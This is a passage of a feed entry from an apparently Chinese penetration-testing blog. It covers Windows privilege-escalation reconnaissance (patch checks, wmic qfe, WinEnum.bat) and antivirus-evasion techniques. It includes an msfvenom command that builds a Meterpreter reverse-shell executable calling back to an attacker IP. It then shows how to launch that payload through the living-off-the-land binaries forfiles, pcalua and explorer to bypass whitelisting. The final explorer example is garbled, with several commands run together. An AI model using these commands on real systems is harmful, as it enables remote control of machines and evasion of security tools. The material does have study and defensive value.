class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">KB4013389 is Yes  </span><br><span class="line">KB3199135 is Yes  </span><br><span class="line">KB3186973 is Yes  </span><br><span class="line">KB3178466 is Yes  </span><br><span class="line">KB3164038 is Yes  </span><br><span class="line">KB3143145 is Yes  </span><br><span class="line">KB3143141 is Yes  </span><br><span class="line">KB3136041 is Yes  </span><br><span class="line">K3134228 is Yes  </span><br><span class="line">KB3089656 is Yes  </span><br><span class="line">KB3067505 is Yes  </span><br><span class="line">KB3077657 is Yes  </span><br><span class="line">KB3057839 is Yes  </span><br><span class="line">KB3057191 is Yes  </span><br><span class="line">KB3031432 is Yes  </span><br><span class="line">KB3036220 is Yes  </span><br><span class="line">KB3023266 is Yes</span><br></pre></td></tr></table></figure><h5 id="2003服务器查看补丁"><a href="#2003服务器查看补丁" class="headerlink" title="2003服务器查看补丁"></a>2003服务器查看补丁</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list full</span><br></pre></td></tr></table></figure><h4 id="提权信息收集脚本"><a href="#提权信息收集脚本" class="headerlink" title="提权信息收集脚本"></a>提权信息收集脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinEnum.bat</span><br></pre></td></tr></table></figure><p>使用之后会在当前目录下生成report.txt文件。</p><h2 id="免杀技巧-执行系统命令方式"><a href="#免杀技巧-执行系统命令方式" class="headerlink" title="免杀技巧-执行系统命令方式"></a>免杀技巧-执行系统命令方式</h2><p>在渗透测试中，拿到shell之后发现无法调用cmd.exe，可以上传一个自己的cmd.exe。但是有些电脑含有杀毒软件，将监视二进制文件，所以我们需要绕过检测。</p><p>Windows系统提供了多个二进制文件，可以使用它们执行任意命令。</p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>未正确配置白名单规则（这里涵盖了文件名和路径），使得一些系统可执行文件能够执行。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.1.10 lport&#x3D;8888 -f exe -o hacker.exe</span><br></pre></td></tr></table></figure><p>攻击机监听</p><h4 id="免杀绕过"><a href="#免杀绕过" class="headerlink" title="免杀绕过"></a>免杀绕过</h4><h5 id="Forfiles"><a href="#Forfiles" class="headerlink" title="Forfiles"></a>Forfiles</h5><h6 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h6><p>forfiles是Windows Server 2003内置的命令行文件，forfiles是一款windows平台的软件工具，其中选择文件并运行一个命令来操作文件，其它系统未必适用。不过，win2003以上的系统，包括win7、windows server 2008均适用。forfiles 是一个命令实用程序，可以选择多个文件并在它们上运行命令，它通常用于批处理作业中，但可能会被滥用以执行任意命令或可执行文件。</p><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles [&#x2F;p Path ] [&#x2F;m SearchMask ] [&#x2F;s ] [&#x2F;c Command ] [&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;]]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;p Path</span><br></pre></td></tr></table></figure><p>指定Path ，表明要从哪里开始搜索。默认的文件夹是当前工作目录，该目录通过键入句号(.) 指定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;m SearchMask</span><br></pre></td></tr></table></figure><p>按照SearchMask 搜索文件。默认的SearchMask 是*.* 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;s</span><br></pre></td></tr></table></figure><p>指示forfiles 在子目录中搜索。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;c Command</span><br></pre></td></tr></table></figure><p>在每个文件上运行指定的Command 。带有空格的命令字符串必须用引号括起来。默认的Command 是”cmd /c echo @file” 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;]</span><br></pre></td></tr></table></figure><p>选择日期大于或等于(+ )（或者小于或等于(- )）指定日期的文件，其中MM / DD / YYYY 是指定的日期，DD 是当前日期减去DD 天。如果未指定+ 或- ，则使用+ 。DD 的有效范围是0 - 32768。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?</span><br></pre></td></tr></table></figure><p>在命令提示符下显示帮助。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles -p &quot;D:\testFolder&quot; -s -m &quot;*.csv&quot; -d -100 -c &quot;cmd &#x2F;c del @FILE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p指定了搜索的根目录为&quot;D:\testFolder&quot;</span><br><span class="line">递归的搜索(-s)</span><br><span class="line">搜索到的文件名的匹配模式是&quot;*.csv&quot;</span><br><span class="line">文件的日期(创建日期？修改日期？)是100天之前的文件</span><br><span class="line">对于所有得到的文件，都执行一个命令为&quot;cmd &#x2F;c del @FILE&quot;，表示要删除这个文件。</span><br></pre></td></tr></table></figure><h6 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p指定搜索的根目录</span><br><span class="line">&#x2F;m 指定搜索的文件名字</span><br><span class="line">-c执行的命令--这里就是执行我们的木马文件。</span><br></pre></td></tr></table></figure><p>hacker.exe 将是forfiles.exe子进程。</p><h5 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h5><h6 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h6><p>Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。当它检测到存在兼容性问题的软件时就会运行。该实用程序位于” C：\ Windows \ System32 “中，并且可以使用” -a”参数执行命令。</p><h6 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p>hacker.exe将是一个新的父进程。</p><h5 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h5><h6 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h6><p>可以将explorer.exe 用作执行方法。执行的有效负载将在系统上创建一个进程，该进程将把explorer.exe作为父进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer.exe C:\tmp\hacker.exe explorer.exe &#x2F;root,&quot;C:\tmp\hacker.exe&quot;explorer.exe 0XAXSDD-Hacker, &quot;C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;常用信息收集命令&quot;&gt;&lt;a href=&quot;#常用信息收集命令&quot; class=&quot;headerlink&quot; title=&quot;常用信息收集命令&quot;&gt;&lt;/a&gt;常用信息收集命令&lt;/h2&gt;&lt;h4 id=&quot;netstat-ano&quot;&gt;&lt;a href=&quot;#netstat-ano&quot; class</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
